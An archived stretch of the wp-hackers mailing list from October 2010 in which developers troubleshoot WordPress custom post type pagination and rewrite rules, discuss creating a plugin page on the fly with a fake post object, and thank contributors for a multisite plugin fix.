From me at olumidealabi.com  Wed Oct 27 06:24:31 2010
From: me at olumidealabi.com (Olumide Alabi)
Date: Wed, 27 Oct 2010 07:24:31 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
Message-ID: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>

Hi Guys,
I'm working on a project which is pretty much wrapped up except for one
issue.

Let me give you a bit of background here.

I'm using WordPress 3.0.1 and I've built a lot of the functionality needed
on the the site into the *functions.php* file.

I'm using about a dozen custom post types to handle different portions of
content on the site.

Everything works fine, except that I get a 404 error when I try to paginate
entries.

Take this page for example http://www.oandoplc.com/media/press-releases/

The Press Releases are a custom post type and this page itself is a custom
page template that lists all press releases.
Everything works fine. If you click on any of the *Read More* buttons, it
takes you to the actual press release which is powered by a Single Post
Template for press releases

The problem occurs when I try to go the next page of this list. That's where
I get a 404.

If I go into the Admin area and change the permalink setting to default and
then return it to whatever it was before, Pagination starts to work but
then, I start getting a 404 when I want to view individual press releases or
single posts for other custom post types I've created. I don't know if this
is because I'm using custom post types or I've just done something
completely wrong.

I would really appreciate all the help I can get on this.

Thanks.
-- 
Best Regards

Olumide Alabi
Mobile | +234 802 359 9606
CDMA | +234 702 838 6589
<http://www.holidaysandcash.com/luminus>
Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
Facebook] <http://www.facebook.com/luminus>[image:
Tumblr]<http://luminus.tumblr.com>[image:
Twitter] <http://twitter.com/luminus>

From johnbillion+wp at gmail.com  Wed Oct 27 06:53:25 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Wed, 27 Oct 2010 07:53:25 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
Message-ID: <AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>

Hi Olumide,

First up, WordPress 3.1 is on target to support custom post type index
pages [1] so you won't need to use custom page templates or other
methods in the future.

In the mean time you could try using the Smarter Custom Post Types
library [2] which gives you this functionality.

Finally - I'm not sure if this will work or not on pages - in the
query on your custom page template you could try passing the 'paged'
query variable into the query:

get_posts( 'post_type=foo&paged=' . get_query_var('paged') );

This will cause the query to return the second page of results when
viewing /page/2/, etc.

John

[1] http://core.trac.wordpress.org/ticket/13818
[2] http://somadesign.ca/projects/smarter-custom-post-types/

On Wed, Oct 27, 2010 at 7:24 AM, Olumide Alabi <me at olumidealabi.com> wrote:
> Hi Guys,
> I'm working on a project which is pretty much wrapped up except for one
> issue.
>
> Let me give you a bit of background here.
>
> I'm using WordPress 3.0.1 and I've built a lot of the functionality needed
> on the the site into the *functions.php* file.
>
> I'm using about a dozen custom post types to handle different portions of
> content on the site.
>
> Everything works fine, except that I get a 404 error when I try to paginate
> entries.
>
> Take this page for example http://www.oandoplc.com/media/press-releases/
>
> The Press Releases are a custom post type and this page itself is a custom
> page template that lists all press releases.
> Everything works fine. If you click on any of the *Read More* buttons, it
> takes you to the actual press release which is powered by a Single Post
> Template for press releases
>
> The problem occurs when I try to go the next page of this list. That's where
> I get a 404.
>
> If I go into the Admin area and change the permalink setting to default and
> then return it to whatever it was before, Pagination starts to work but
> then, I start getting a 404 when I want to view individual press releases or
> single posts for other custom post types I've created. I don't know if this
> is because I'm using custom post types or I've just done something
> completely wrong.
>
> I would really appreciate all the help I can get on this.
>
> Thanks.
> --
> Best Regards
>
> Olumide Alabi
> Mobile | +234 802 359 9606
> CDMA | +234 702 838 6589
> <http://www.holidaysandcash.com/luminus>
> Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
> Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
> Facebook] <http://www.facebook.com/luminus>[image:
> Tumblr]<http://luminus.tumblr.com>[image:
> Twitter] <http://twitter.com/luminus>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From me at olumidealabi.com  Wed Oct 27 08:08:10 2010
From: me at olumidealabi.com (Olumide Alabi)
Date: Wed, 27 Oct 2010 09:08:10 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
Message-ID: <AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>

Hi John,
Thanks for the heads up. Can't wait for 3.1 to pop out.

I'm already using *get_query_var('paged')* that's why it outputs the
pagination structure.

I'll go take a look at the Smarter Custom Post Types library and report back
with my findings.

-- 
Best Regards

Olumide Alabi
Mobile | +234 802 359 9606
CDMA | +234 702 838 6589
<http://www.holidaysandcash.com/luminus>
Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
Facebook] <http://www.facebook.com/luminus>[image:
Tumblr]<http://luminus.tumblr.com>[image:
Twitter] <http://twitter.com/luminus>

From wordpress at zed1.com  Wed Oct 27 09:01:03 2010
From: wordpress at zed1.com (Mike Little)
Date: Wed, 27 Oct 2010 10:01:03 +0100
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <4CC787CB.2000705@duechiacchiere.it>
References: <4CC7845C.8040000@duechiacchiere.it>
	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
	<4CC787CB.2000705@duechiacchiere.it>
Message-ID: <AANLkTikBaCGyXL7rjjn4VQQV=ANLTh1hY-+0Srp3=bmf@mail.gmail.com>

On 27 October 2010 03:00, Dino Termini <dino at duechiacchiere.it> wrote:

> On 10/26/2010 9:56 PM, Anthony Cole wrote:
>
>> I would use a shortcode, and you could filter out the_content and replace
>> it with do_shortcode('shortcode')  or a function, checking the Post ID
>> through the post global.
>>
>> Would be interested to see if anyone else has a suggestion.
>>
>> -ac
>>
>
> Right, but the point is to totally avoid creating this page at all :-)
>
>
>

Here is what I did on a multi-site project project that required a number of
predefined pages.
It basically creates the page on the fly, but only if it doesn't already
exist.

http://wordpress.pastebin.com/LFGiBC8h

You can add a shortcode as the sole content of the fake page so that it is
handled by normal processing, for example.


Mike
-- 
Mike Little
http://zed1.com/

From dino at duechiacchiere.it  Wed Oct 27 10:09:48 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Wed, 27 Oct 2010 06:09:48 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <AANLkTikBaCGyXL7rjjn4VQQV=ANLTh1hY-+0Srp3=bmf@mail.gmail.com>
References: <4CC7845C.8040000@duechiacchiere.it>	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>	<4CC787CB.2000705@duechiacchiere.it>
	<AANLkTikBaCGyXL7rjjn4VQQV=ANLTh1hY-+0Srp3=bmf@mail.gmail.com>
Message-ID: <4CC7FA6C.70204@duechiacchiere.it>

Thank you everybody, I'll definitely take a look at your suggestions. As 
for the users complaining... I agree, some people should appreciate what 
they get for free instead of being a pain in the arse (sorry) for us 
developer :-)

dino.

From dino at duechiacchiere.it  Wed Oct 27 10:28:04 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Wed, 27 Oct 2010 06:28:04 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <AANLkTimDbskvQ=nDGVkKwMRfJLgPvJ9ZCWTz682F_zs6@mail.gmail.com>
References: <4CC7845C.8040000@duechiacchiere.it>	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>	<4CC787CB.2000705@duechiacchiere.it>	<CE457875-1F2A-4F26-8A60-A25C07A7DEBE@radiopicture.com.au>
	<AANLkTimDbskvQ=nDGVkKwMRfJLgPvJ9ZCWTz682F_zs6@mail.gmail.com>
Message-ID: <4CC7FEB4.3000902@duechiacchiere.it>

On 10/26/2010 10:16 PM, Dion Hulse (dd32) wrote:
> Here's how I'd do it in a plugin if the page had to be transparent.
> http://wordpress.pastebin.com/xd0QmvNH
> Note, That i've pastebin'd it due to sheer length of the fake post object.
> It's a 5 minute job, needs optimizing and all that..

Hi there, thank you for sharing this piece of code. As far as I can see 
posts_results is not used anymore in Wordpress, I cannot find anything 
about it in the Codex, and here it says it only applies to WP 2.6

http://adambrown.info/p/wp_hooks/hook/posts_results?version=2.6&file=wp-includes/query.php 
<http://adambrown.info/p/wp_hooks/hook/posts_results?version=2.6&file=wp-includes/query.php>

Do you happen to know what's the new 'version' of this hook?

Thanks,
dino.

From me at olumidealabi.com  Wed Oct 27 10:32:02 2010
From: me at olumidealabi.com (Olumide Alabi)
Date: Wed, 27 Oct 2010 11:32:02 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
Message-ID: <AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>

Hi Guys,
Sadly, I haven't made any headway with this.

I took this from the Smarter Custom Post Types library

add_filter( 'generate_rewrite_rules', array($this, 'add_rewrite_rules') );

public function add_rewrite_rules( $wp_rewrite ) {
	$new_rules = array();
	$new_rules[$this->post_slug . '/page/?([0-9]{1,})/?$'] =
'index.php?post_type=' . $this->post_type . '&paged=' .
$wp_rewrite->preg_index(1);
	$new_rules[$this->post_slug . '/(feed|rdf|rss|rss2|atom)/?$'] =
'index.php?post_type=' . $this->post_type . '&feed=' .
$wp_rewrite->preg_index(1);
	$new_rules[$this->post_slug . '/?$'] = 'index.php?post_type=' .
$this->post_type;

	$wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
	return $wp_rewrite;
}

and made it into this


add_filter( 'generate_rewrite_rules', 'add_rewrite_rules' );

function add_rewrite_rules( $wp_rewrite ) {
$new_rules = array();
 $new_rules['media/press-releases' . '/page/?([0-9]{1,})/?$'] =
'index.php?post_type=press_release&paged=' . $wp_rewrite->preg_index(1);
 $new_rules['media/press-releases' . '/(feed|rdf|rss|rss2|atom)/?$'] =
'index.php?post_type=press_release&feed=' . $wp_rewrite->preg_index(1);
 $wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
return $wp_rewrite;
}

since I'm trying to fix just the Press Releases issue. I didn't use the
library itself as it would mean that I had to recreate all my custom post
types using the library. I just took this bit of code and put it in my
*functions.php* file.

The line that deals with feeds works, so I can reach the feeds by just
appending '/feed/' to the URL. The funny thing is that this was just icing
on the cake.

The other one that's supposed to handle pagination, which is the actual
problem I'm tryna fix,  just throws me to the Home Page.

Right now, I'm kinda lost.

Help! Please!!
-- 
Best Regards

Olumide Alabi
Mobile | +234 802 359 9606
CDMA | +234 702 838 6589
<http://www.holidaysandcash.com/luminus>
Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
Facebook] <http://www.facebook.com/luminus>[image:
Tumblr]<http://luminus.tumblr.com>[image:
Twitter] <http://twitter.com/luminus>

From wp at andrewnacin.com  Wed Oct 27 10:34:07 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Wed, 27 Oct 2010 06:34:07 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <4CC7FEB4.3000902@duechiacchiere.it>
References: <4CC7845C.8040000@duechiacchiere.it>
	<7C0D6D6C-77BB-4CB7-85E5-25989D8717EE@radiopicture.com.au>
	<4CC787CB.2000705@duechiacchiere.it>
	<CE457875-1F2A-4F26-8A60-A25C07A7DEBE@radiopicture.com.au>
	<AANLkTimDbskvQ=nDGVkKwMRfJLgPvJ9ZCWTz682F_zs6@mail.gmail.com>
	<4CC7FEB4.3000902@duechiacchiere.it>
Message-ID: <AANLkTinryF++mg5J=QP187Kh4YqPkEDEdUEc0TFcM1_C@mail.gmail.com>

On Wed, Oct 27, 2010 at 6:28 AM, Dino Termini <dino at duechiacchiere.it>wrote:

> On 10/26/2010 10:16 PM, Dion Hulse (dd32) wrote:
>
>> Here's how I'd do it in a plugin if the page had to be transparent.
>> http://wordpress.pastebin.com/xd0QmvNH
>> Note, That i've pastebin'd it due to sheer length of the fake post object.
>> It's a 5 minute job, needs optimizing and all that..
>>
>
> Hi there, thank you for sharing this piece of code. As far as I can see
> posts_results is not used anymore in Wordpress, I cannot find anything about
> it in the Codex, and here it says it only applies to WP 2.6


It's still there. Can't trust everything you read unfortunately, and the
hooks DB has had some issues keeping up with some of our changes. (We're
working on an official one.) Best to check the source directly when in doubt
-- open the file and use the Find tool of your editor.

wp-includes/query.php ~ line 2419 in WordPress 3.0.x
$this->posts = apply_filters_ref_array('posts_results', array( $this->posts,
&$this ) );

From rafaehlers at gmail.com  Wed Oct 27 11:14:41 2010
From: rafaehlers at gmail.com (Rafael Ehlers)
Date: Wed, 27 Oct 2010 09:14:41 -0200
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
Message-ID: <AANLkTincH8YKPz0TWDzu_jUTxJ0jr5i4hjFVTYQ+zd1h@mail.gmail.com>

Use this class/plugin:
http://scott.sherrillmix.com/blog/blogger/creating-a-better-fake-post-with-a-wordpress-plugin/

A lot of plugins are using it.

Best Regards,

Rafael *Ehlers*

---------- Forwarded message ----------
From: Dino Termini <dino at duechiacchiere.it>
To: wp-hackers at lists.automattic.com
Date: Tue, 26 Oct 2010 21:46:04 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
Hi everybody,

I'm developing a plugin that displays a page for the users with various
options. Right now, I'm using

insert_post()

to create the page when the plugin is activated, and then
add_filter('the_content') whose attached functions runs only if the ID of
the current page matches the one of the page I created. Some of my users
have pointed out that creating a new page 'clutters' their blog, so I was
wondering if there's a different way to "load the current theme" and display
my custom content in place of the_content(). Please let me know if you need
more details.

Thanks,
Camu

From dino at duechiacchiere.it  Wed Oct 27 13:08:29 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Wed, 27 Oct 2010 09:08:29 -0400
Subject: [wp-hackers] Displaying a page on-the-fly with a plugin
In-Reply-To: <AANLkTincH8YKPz0TWDzu_jUTxJ0jr5i4hjFVTYQ+zd1h@mail.gmail.com>
References: <AANLkTincH8YKPz0TWDzu_jUTxJ0jr5i4hjFVTYQ+zd1h@mail.gmail.com>
Message-ID: <4CC8244D.2070308@duechiacchiere.it>

Thank you. So, just to recap for other people who may be interested in 
this, the trick is to use the 'the_posts' hook and create an object with 
the hooked function that makes Wordpress think that's the post returned 
by the query. Clever!

Dino.

PS: Andrew, thank you for clarifying the question about the codex.

On 10/27/2010 7:14 AM, Rafael Ehlers wrote:
> Use this class/plugin:
> http://scott.sherrillmix.com/blog/blogger/creating-a-better-fake-post-with-a-wordpress-plugin/
>
> A lot of plugins are using it.
>
> Best Regards,
>
> Rafael *Ehlers*

From mccormicky at gmail.com  Wed Oct 27 13:35:41 2010
From: mccormicky at gmail.com (mccormicky)
Date: Wed, 27 Oct 2010 09:35:41 -0400
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
	<AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>
Message-ID: <AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>

I'm going to be attempting this soon which is why I saved this link.

http://boring-group.com/blog/2010/05/28/wordpress-query_posts-with-custom-post_types-and-paged-solved/




On Wed, Oct 27, 2010 at 6:32 AM, Olumide Alabi <me at olumidealabi.com> wrote:

> Hi Guys,
> Sadly, I haven't made any headway with this.
>
> I took this from the Smarter Custom Post Types library
>
> add_filter( 'generate_rewrite_rules', array($this, 'add_rewrite_rules') );
>
> public function add_rewrite_rules( $wp_rewrite ) {
>        $new_rules = array();
>        $new_rules[$this->post_slug . '/page/?([0-9]{1,})/?$'] =
> 'index.php?post_type=' . $this->post_type . '&paged=' .
> $wp_rewrite->preg_index(1);
>        $new_rules[$this->post_slug . '/(feed|rdf|rss|rss2|atom)/?$'] =
> 'index.php?post_type=' . $this->post_type . '&feed=' .
> $wp_rewrite->preg_index(1);
>        $new_rules[$this->post_slug . '/?$'] = 'index.php?post_type=' .
> $this->post_type;
>
>        $wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
>        return $wp_rewrite;
> }
>
> and made it into this
>
>
> add_filter( 'generate_rewrite_rules', 'add_rewrite_rules' );
>
> function add_rewrite_rules( $wp_rewrite ) {
> $new_rules = array();
>  $new_rules['media/press-releases' . '/page/?([0-9]{1,})/?$'] =
> 'index.php?post_type=press_release&paged=' . $wp_rewrite->preg_index(1);
>  $new_rules['media/press-releases' . '/(feed|rdf|rss|rss2|atom)/?$'] =
> 'index.php?post_type=press_release&feed=' . $wp_rewrite->preg_index(1);
>  $wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
> return $wp_rewrite;
> }
>
> since I'm trying to fix just the Press Releases issue. I didn't use the
> library itself as it would mean that I had to recreate all my custom post
> types using the library. I just took this bit of code and put it in my
> *functions.php* file.
>
> The line that deals with feeds works, so I can reach the feeds by just
> appending '/feed/' to the URL. The funny thing is that this was just icing
> on the cake.
>
> The other one that's supposed to handle pagination, which is the actual
> problem I'm tryna fix,  just throws me to the Home Page.
>
> Right now, I'm kinda lost.
>
> Help! Please!!
> --
> Best Regards
>
> Olumide Alabi
> Mobile | +234 802 359 9606
> CDMA | +234 702 838 6589
> <http://www.holidaysandcash.com/luminus>
> Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
> Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
> Facebook] <http://www.facebook.com/luminus>[image:
> Tumblr]<http://luminus.tumblr.com>[image:
> Twitter] <http://twitter.com/luminus>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ardee.aram at gmail.com  Wed Oct 27 13:53:24 2010
From: ardee.aram at gmail.com (Ardee Aram)
Date: Wed, 27 Oct 2010 21:53:24 +0800
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
	<AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>
	<AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>
Message-ID: <AANLkTi=LhDo6Naa-YgR6Q0RoGZX60w6eenTdSd=Ttv==@mail.gmail.com>

Thanks McCormicky, this solution arrived just in time.

Regards,

Ardee ARam

On Wed, Oct 27, 2010 at 9:35 PM, mccormicky <mccormicky at gmail.com> wrote:
> I'm going to be attempting this soon which is why I saved this link.
>
> http://boring-group.com/blog/2010/05/28/wordpress-query_posts-with-custom-post_types-and-paged-solved/
>
>
>
>
> On Wed, Oct 27, 2010 at 6:32 AM, Olumide Alabi <me at olumidealabi.com> wrote:
>
>> Hi Guys,
>> Sadly, I haven't made any headway with this.
>>
>> I took this from the Smarter Custom Post Types library
>>
>> add_filter( 'generate_rewrite_rules', array($this, 'add_rewrite_rules') );
>>
>> public function add_rewrite_rules( $wp_rewrite ) {
>> ? ? ? ?$new_rules = array();
>> ? ? ? ?$new_rules[$this->post_slug . '/page/?([0-9]{1,})/?$'] =
>> 'index.php?post_type=' . $this->post_type . '&paged=' .
>> $wp_rewrite->preg_index(1);
>> ? ? ? ?$new_rules[$this->post_slug . '/(feed|rdf|rss|rss2|atom)/?$'] =
>> 'index.php?post_type=' . $this->post_type . '&feed=' .
>> $wp_rewrite->preg_index(1);
>> ? ? ? ?$new_rules[$this->post_slug . '/?$'] = 'index.php?post_type=' .
>> $this->post_type;
>>
>> ? ? ? ?$wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
>> ? ? ? ?return $wp_rewrite;
>> }
>>
>> and made it into this
>>
>>
>> add_filter( 'generate_rewrite_rules', 'add_rewrite_rules' );
>>
>> function add_rewrite_rules( $wp_rewrite ) {
>> $new_rules = array();
>> ?$new_rules['media/press-releases' . '/page/?([0-9]{1,})/?$'] =
>> 'index.php?post_type=press_release&paged=' . $wp_rewrite->preg_index(1);
>> ?$new_rules['media/press-releases' . '/(feed|rdf|rss|rss2|atom)/?$'] =
>> 'index.php?post_type=press_release&feed=' . $wp_rewrite->preg_index(1);
>> ?$wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
>> return $wp_rewrite;
>> }
>>
>> since I'm trying to fix just the Press Releases issue. I didn't use the
>> library itself as it would mean that I had to recreate all my custom post
>> types using the library. I just took this bit of code and put it in my
>> *functions.php* file.
>>
>> The line that deals with feeds works, so I can reach the feeds by just
>> appending '/feed/' to the URL. The funny thing is that this was just icing
>> on the cake.
>>
>> The other one that's supposed to handle pagination, which is the actual
>> problem I'm tryna fix, ?just throws me to the Home Page.
>>
>> Right now, I'm kinda lost.
>>
>> Help! Please!!
>> --
>> Best Regards
>>
>> Olumide Alabi
>> Mobile | +234 802 359 9606
>> CDMA | +234 702 838 6589
>> <http://www.holidaysandcash.com/luminus>
>> Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
>> Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
>> Facebook] <http://www.facebook.com/luminus>[image:
>> Tumblr]<http://luminus.tumblr.com>[image:
>> Twitter] <http://twitter.com/luminus>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
-
Ardee Aram

From dino at duechiacchiere.it  Wed Oct 27 14:13:16 2010
From: dino at duechiacchiere.it (Dino Termini)
Date: Wed, 27 Oct 2010 10:13:16 -0400
Subject: [wp-hackers] Plugins can now be multisite aware
Message-ID: <4CC8337C.6090607@duechiacchiere.it>

I'd like to publicly thank Scribu and the other guys who took care of 
this issue

http://core.trac.wordpress.org/ticket/14170 
<http://core.trac.wordpress.org/ticket/14170#comment:29>

for their outstanding support and for fixing the issue of 
network-activating a plugin. You guys rock!

dino.

From mail at scribu.net  Wed Oct 27 14:20:08 2010
From: mail at scribu.net (scribu)
Date: Wed, 27 Oct 2010 17:20:08 +0300
Subject: [wp-hackers] Plugins can now be multisite aware
In-Reply-To: <4CC8337C.6090607@duechiacchiere.it>
References: <4CC8337C.6090607@duechiacchiere.it>
Message-ID: <AANLkTi=5eKBoPhqE6YY7=BHzAqjpNLncRKmvNP0EAT8e@mail.gmail.com>

Thank you for the kind words.

Please note that it's still up to each plugin to handle network activation
on it's own.

From me at olumidealabi.com  Wed Oct 27 15:13:46 2010
From: me at olumidealabi.com (Olumide Alabi)
Date: Wed, 27 Oct 2010 16:13:46 +0100
Subject: [wp-hackers] Permalinks, Custom Post Types & Pagination
In-Reply-To: <AANLkTi=LhDo6Naa-YgR6Q0RoGZX60w6eenTdSd=Ttv==@mail.gmail.com>
References: <AANLkTi=GXh1K3-_73-=9TzxELQ7jV=ofHm8KzL3d9s-y@mail.gmail.com>
	<AANLkTin74J6sgKdP-2Yu7VnFTH2t4eUYrEc9ga=hxxDq@mail.gmail.com>
	<AANLkTinU8uGZjFikt6Y+-d7x-JAf6mCbRatk7N_V99Bi@mail.gmail.com>
	<AANLkTinywc5zkQ9owxtYn4CmBwjEu0PP3cAKXGCJerTE@mail.gmail.com>
	<AANLkTinN2y2L0ofrqrWXotP8dyZdSFTEp29xui2RP-=Z@mail.gmail.com>
	<AANLkTi=LhDo6Naa-YgR6Q0RoGZX60w6eenTdSd=Ttv==@mail.gmail.com>
Message-ID: <AANLkTin646EbEQ-UyrRHAzTEZQntjyLyQ+ZkrTVLtaUq@mail.gmail.com>

Thanks McCormicky,
But for some reason I'm still without a solution. This seems to work exactly
as what I had before.

On Wed, Oct 27, 2010 at 2:53 PM, Ardee Aram <ardee.aram at gmail.com> wrote:

> Thanks McCormicky, this solution arrived just in time.
>
> Regards,
>
> Ardee ARam
>
> On Wed, Oct 27, 2010 at 9:35 PM, mccormicky <mccormicky at gmail.com> wrote:
> > I'm going to be attempting this soon which is why I saved this link.
> >
> >
> http://boring-group.com/blog/2010/05/28/wordpress-query_posts-with-custom-post_types-and-paged-solved/
> >
> >
> >
> >
> > On Wed, Oct 27, 2010 at 6:32 AM, Olumide Alabi <me at olumidealabi.com>
> wrote:
> >
> >> Hi Guys,
> >> Sadly, I haven't made any headway with this.
> >>
> >> I took this from the Smarter Custom Post Types library
> >>
> >> add_filter( 'generate_rewrite_rules', array($this, 'add_rewrite_rules')
> );
> >>
> >> public function add_rewrite_rules( $wp_rewrite ) {
> >>        $new_rules = array();
> >>        $new_rules[$this->post_slug . '/page/?([0-9]{1,})/?$'] =
> >> 'index.php?post_type=' . $this->post_type . '&paged=' .
> >> $wp_rewrite->preg_index(1);
> >>        $new_rules[$this->post_slug . '/(feed|rdf|rss|rss2|atom)/?$'] =
> >> 'index.php?post_type=' . $this->post_type . '&feed=' .
> >> $wp_rewrite->preg_index(1);
> >>        $new_rules[$this->post_slug . '/?$'] = 'index.php?post_type=' .
> >> $this->post_type;
> >>
> >>        $wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
> >>        return $wp_rewrite;
> >> }
> >>
> >> and made it into this
> >>
> >>
> >> add_filter( 'generate_rewrite_rules', 'add_rewrite_rules' );
> >>
> >> function add_rewrite_rules( $wp_rewrite ) {
> >> $new_rules = array();
> >>  $new_rules['media/press-releases' . '/page/?([0-9]{1,})/?$'] =
> >> 'index.php?post_type=press_release&paged=' . $wp_rewrite->preg_index(1);
> >>  $new_rules['media/press-releases' . '/(feed|rdf|rss|rss2|atom)/?$'] =
> >> 'index.php?post_type=press_release&feed=' . $wp_rewrite->preg_index(1);
> >>  $wp_rewrite->rules = array_merge($new_rules, $wp_rewrite->rules);
> >> return $wp_rewrite;
> >> }
> >>
> >> since I'm trying to fix just the Press Releases issue. I didn't use the
> >> library itself as it would mean that I had to recreate all my custom
> post
> >> types using the library. I just took this bit of code and put it in my
> >> *functions.php* file.
> >>
> >> The line that deals with feeds works, so I can reach the feeds by just
> >> appending '/feed/' to the URL. The funny thing is that this was just
> icing
> >> on the cake.
> >>
> >> The other one that's supposed to handle pagination, which is the actual
> >> problem I'm tryna fix,  just throws me to the Home Page.
> >>
> >> Right now, I'm kinda lost.
> >>
> >> Help! Please!!
> >> --
> >> Best Regards
> >>
> >> Olumide Alabi
> >> Mobile | +234 802 359 9606
> >> CDMA | +234 702 838 6589
> >> <http://www.holidaysandcash.com/luminus>
> >> Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
> >> Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus
> >[image:
> >> Facebook] <http://www.facebook.com/luminus>[image:
> >> Tumblr]<http://luminus.tumblr.com>[image:
> >> Twitter] <http://twitter.com/luminus>
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> -
> Ardee Aram
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Best Regards

Olumide Alabi
Mobile | +234 802 359 9606
CDMA | +234 702 838 6589
<http://www.holidaysandcash.com/luminus>
Chat [image: Google Talk:] luminusdadon [image: Skype:] luminusdadon
Contact Me [image: Linkedin] <http://www.linkedin.com/in/luminus>[image:
Facebook] <http://www.facebook.com/luminus>[image:
Tumblr]<http://luminus.tumblr.com>[image:
Twitter] <http://twitter.com/luminus>

From emoya at tribune.com  Wed Oct 27 15:29:30 2010
From: emoya at tribune.com (Moya, Eddie)
Date: Wed, 27 Oct 2010 10:29:30 -0500
Subject: [wp-hackers] "The Matrix Has You" easter egg
